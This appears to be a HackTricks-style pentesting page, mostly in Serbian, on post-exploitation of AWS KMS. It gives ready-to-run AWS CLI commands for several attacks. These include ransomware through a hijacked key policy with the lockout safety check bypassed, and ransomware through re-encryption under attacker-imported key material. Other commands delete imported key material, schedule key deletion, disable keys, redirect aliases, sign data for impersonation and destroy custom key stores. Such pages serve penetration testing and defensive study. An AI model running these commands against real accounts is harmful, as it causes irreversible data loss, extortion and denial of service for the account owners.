# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Za više informacija pogledajte:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` Čita fajl u binarnom modu, obično se koristi za fajlove koji nisu tekstualni.
- `file://:` Čita fajl u tekstualnom modu, tipično se koristi za fajlove običnog teksta, skripte ili JSON koji nema posebne zahteve za kodiranje.

> [!TIP]
> Imajte na umu da, ako želite da dešifrujete neke podatke unutar fajla, fajl mora da sadrži binarne podatke, a ne base64 enkodirane podatke. (fileb://)

- Korišćenje **simetričnog** ključa
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Korišćenje **asymmetric** key:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Napadač sa privilegovanim pristupom KMS-u može izmeniti KMS politiku ključeva i dodeliti svom nalogu pristup tim ključevima, uklanjajući pristup koji je dodeljen legitimnom nalogu.

Nakon toga, korisnici legitimnog naloga neće moći da pristupe bilo kojoj informaciji bilo kog servisa koji je šifrovan tim ključevima, stvarajući jednostavan, ali efikasan ransomware nad nalogom.

> [!WARNING]
> Imajte na umu da **AWS managed keys aren't affected** ovim napadom, samo **Customer managed keys**.
>
> Takođe imajte na umu potrebu za korišćenjem parametra **`--bypass-policy-lockout-safety-check`** (nedostatak ove opcije u web konzoli čini ovaj napad mogućim samo iz CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Imajte na umu da ako promenite tu politiku i date pristup samo eksternom nalogu, i zatim iz tog eksternog naloga pokušate da postavite novu politiku da biste **give the access back to original account, you won't be able cause the Put Polocy action cannot be performed from a cross account**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Postoji još jedan način da se izvede globalni KMS Ransomware, koji bi uključivao sledeće korake:

- Kreirajte novi **key with a key material** importovan od strane attacker
- **Re-encrypt older data** of the victim koja je enkriptovana prethodnom verzijom, koristeći novu
- **Delete the KMS key**
- Sada samo attacker, koji poseduje original key material, može da dešifruje šifrovane podatke

### Delete Keys via kms:DeleteImportedKeyMaterial

Sa dozvolom `kms:DeleteImportedKeyMaterial`, entitet može izbrisati importovan key material iz CMKs sa `Origin=EXTERNAL` (CMKs koji su importovali svoj key material), čineći ih nesposobnim da dešifruju podatke. Ova akcija je destruktivna i nepovratna osim ako kompatibilni materijal nije ponovo importovan, omogućavajući attacker-u da efikasno izazove gubitak podataka sličan ransomware-u čineći šifrovane informacije trajno nedostupnim.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Uništavanje keys

Uništavanjem keys moguće je izazvati DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Imajte na umu da AWS sada **sprečava da se prethodne radnje izvrše iz drugog naloga:**

### Promena ili brisanje Alias-a
Ovaj napad briše ili preusmerava AWS KMS alias-e, narušavajući rešavanje ključeva i izazivajući trenutne greške u svim servisima koji zavise od tih alias-a, što rezultira denial-of-service. Sa dozvolama kao što su `kms:DeleteAlias` ili `kms:UpdateAlias` napadač može ukloniti ili preusmeriti alias-e i ometati kriptografske operacije (npr. encrypt, describe). Bilo koji servis koji referencira alias umesto key ID može prestati da radi dok se alias ne vrati ili pravilno preslika.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Otkaži brisanje ključa
Sa dozvolama kao što su `kms:CancelKeyDeletion` i `kms:EnableKey`, napadač može otkazati zakazano brisanje AWS KMS customer master key i kasnije ga ponovo omogućiti. Time se ključ oporavlja (prvobitno u Disabled stanju) i vraća se njegova sposobnost da dešifruje prethodno zaštićene podatke, omogućavajući exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Onemogućavanje ključa
Sa dozvolom `kms:DisableKey`, napadač može onemogućiti AWS KMS customer master key, sprečavajući njegovo korišćenje za šifrovanje ili dešifrovanje. To prekida pristup za sve servise koji zavise od tog CMK i može izazvati trenutne poremećaje ili denial-of-service dok se ključ ponovo ne omogući.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Izračunavanje zajedničke tajne
Sa `kms:DeriveSharedSecret` dozvolom, akter može da koristi privatni ključ koji drži KMS i javni ključ koji obezbedi korisnik da izračuna ECDH zajedničku tajnu.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Sa dozvolom `kms:Sign`, napadač može koristiti KMS-stored CMK da kriptografski potpiše podatke bez izlaganja privatnog ključa, proizvodeći važeće potpise koji mogu omogućiti impersonation ili autorizovati maliciozne radnje.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS sa Custom Key Stores
Sa dozvolama kao što su `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, ili `kms:UpdateCustomKeyStore`, napadač može izmeniti, diskonektovati ili izbrisati AWS KMS Custom Key Store (CKS), čime čini njegove master keys neupotrebljivim. To prekida operacije enkripcije, dekripcije i potpisivanja za bilo koje servise koji zavise od tih ključeva i može prouzrokovati trenutni denial-of-service. Zbog toga je kritično ograničiti i nadzirati te dozvole.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
